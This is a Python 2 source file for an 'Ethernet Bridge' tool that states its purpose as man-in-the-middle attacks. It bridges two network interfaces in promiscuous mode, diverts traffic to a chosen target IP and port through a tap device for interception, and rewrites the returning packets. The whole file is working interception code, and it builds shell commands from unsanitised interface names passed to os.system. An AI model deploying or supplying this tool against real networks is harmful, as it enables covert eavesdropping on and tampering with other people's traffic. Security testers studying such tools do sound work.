#! /bin/env python
# -*- coding: utf-8 -*-

"""

Ethernet Bridge

Description: Ethernet bridge for man-in-the-middle attacks.

Markus Mahrla, Jon Barg
GAI NetConsult GmbH

"""

import sys, signal, os, argparse, struct, fcntl 
from fcntl import ioctl
from threading import *
from ConfigParser import *
from pdb import * 
from scapy.all import *
from socket import *

MTU = 32676		# read from socket without bothering maximum transfer unit 
ETH_P_ALL = 0x03	# capture all bytes of packet including ethernet layer 

TUNSETIFF = 0x400454ca  # attach to tun/tap device
IFF_TAP   = 0x0002 	# utilize tap device, i.e. including ethernet layer
IFF_NO_IP = 0x1000 	# omit packet information that is added by kernel

ip_src = 0x1a		# position of ip source address in packet
ip_dst = 0x1e		# position of ip destination address in packet
port_dst = 0x24		# position of destination port address in packet

BUFFERSIZE_DEV = 65000  # read from tap device without bothering maximum transfer unit

class sniffer():

    def __init__(self, iface0, iface1, mitm_in, mitm_out):

       # traffic going from bridged interfaces to man-in-the-middle interface
       if mitm_in:
          self.s_iface0 = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))
          self.s_iface0.bind((iface0, ETH_P_ALL))

          self.s_iface1 = socket(AF_PACKET, SOCK_RAW)
          self.s_iface1.bind((iface1, ETH_P_ALL)) 

          self.receive = self.socket_receive
          self.send = lambda pkt: self.s_iface1.send(pkt)
          self.redirect = self.device_send

       # traffic going from from man-in-the-middle interface to bridged interfaces
       if mitm_out:
          self.s_iface0 = socket(AF_PACKET, SOCK_RAW)
          self.s_iface0.bind((iface0, ETH_P_ALL)) 

          self.s_iface1 = socket(AF_PACKET, SOCK_RAW)
          self.s_iface1.bind((iface1, ETH_P_ALL)) 

          self.receive = self.device_receive
          self.send = lambda pkt: self.s_iface0.send(pkt)
          self.redirect = lambda pkt: self.s_iface1.send(pkt)

    def lock_check(self):
       return not still_running_lock.locked()

    # traffic is intercepted based on destination ip address and destination port
    def intercept(self, pkt_ip, pkt_port):
       if inet_aton(ip) == pkt_ip:
          if pkt_port:
             if struct.pack(">H", int(port[:-1])) == pkt_port:
               return True 
          else:
             return True
       return False

    # traffic leaving man-in-the-middle interface is written back to original addresses
    def device_receive(self):
       try:
          p = os.read(tap_device, BUFFERSIZE_DEV)
          pkt_scapy = Ether(p) 
          if hasattr(pkt_scapy, "IP"): 
             pkt_scapy[Ether].dst = mac
             pkt_scapy[IP].src = ip
             del pkt_scapy[IP].chksum
          if hasattr(pkt_scapy, "TCP"):
             del pkt_scapy[TCP].chksum
          return str(pkt_scapy)
       except error:
          pass

    # traffic to man-in-the-middle interface is modified so it goes through tcp/ip stack
    def device_send(self, pkt):
       try:
          pkt_scapy = Ether(pkt)
          del pkt_scapy[IP].chksum
          del pkt_scapy[TCP].chksum
          pkt_scapy[Ether].dst = "0e:33:7e:2f:19:61"
          pkt_scapy[IP].dst = "1.2.3.4"
          os.write(tap_device, str(pkt_scapy))
       except error:
          pass
    
    def socket_receive(self):
       pkt, sa = self.s_iface0.recvfrom(MTU)
       if sa[2] != PACKET_OUTGOING:
          return pkt
 
    def recv_send_loop(self):
        pkt = ""
        while True:
           try:
              pkt = self.receive()
           except error:
              pass
           if pkt:
              if self.intercept(pkt[ip_src:][:4], None) or self.intercept(pkt[ip_dst:][:4], pkt[port_dst:][:2]):
                 self.redirect(pkt)
              else:
                 self.send(pkt)
           if self.lock_check() == True:
              break

thread1 = None
thread2 = None 
thread3 = None 

still_running_lock = Lock()

def signal_handler(signal, frame):
    still_running_lock.release()
    thread1.join()
    thread2.join()
    thread3.join()
    sys.exit(0)

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='Ethernet Bridge')

    parser.add_argument("-f", nargs=1, dest="file_name", type=str, action='store',
       help='config file to intercept traffic (file syntax of first line: <mac> <ip> <port> (e.g. "04:7d:7b:0f:c1:ca 173.194.116.183 80")')
    parser.add_argument("-r", dest="rewrite", action='store_true', help='rewrite mac address on second interface (taken from first interface)')

    parser.add_argument("interface1", nargs=1, type=str, action='store', help='first interface to bridge')
    parser.add_argument("interface2", nargs=1, type=str, action='store', help='man-in-the-middle interface')
    parser.add_argument("interface3", nargs=1, type=str, action='store', help='second interface to bridge')

    args = parser.parse_args()

    host1_interface = args.interface1[0]
    mitm_interface = args.interface2[0]
    host2_interface = args.interface3[0]

    if args.file_name:
       file = open(args.file_name[0]).readline()
       mac, ip, port = file.split(" ")

    os.system("ifconfig " + host1_interface + " promisc")
    os.system("ifconfig " + host2_interface + " promisc")
    os.system("ip tuntap add dev tap0 mode tap")
    os.system("ifconfig tap0 down")
    os.system("ifconfig tap0 hw ether 0e:33:7e:2f:19:61")
    os.system("ifconfig tap0 up")
    os.system("ifconfig tap0 1.2.3.4")
    os.system("route add -net 192.168.0.0 netmask 255.255.0.0 tap0")
    # todo: ARP request for source IP must answered 

    tap_device = os.open('/dev/net/tun', os.O_RDWR)
    flags = struct.pack('16sH', "tap0", IFF_TAP | IFF_NO_IP)
    fcntl.ioctl(tap_device, TUNSETIFF, flags)

    sniffer1 = sniffer(host1_interface, host2_interface, mitm_interface, 0)
    sniffer2 = sniffer(host2_interface, host1_interface, mitm_interface, 0)
    sniffer3 = sniffer(host1_interface, host2_interface, 0, mitm_interface)

    thread1 = Thread(target=sniffer1.recv_send_loop) 
    thread2 = Thread(target=sniffer2.recv_send_loop)
    thread3 = Thread(target=sniffer3.recv_send_loop)

    still_running_lock.acquire()

    thread1.start()
    thread2.start()
    thread3.start()

    signal.signal(signal.SIGINT, signal_handler)
    signal.pause()
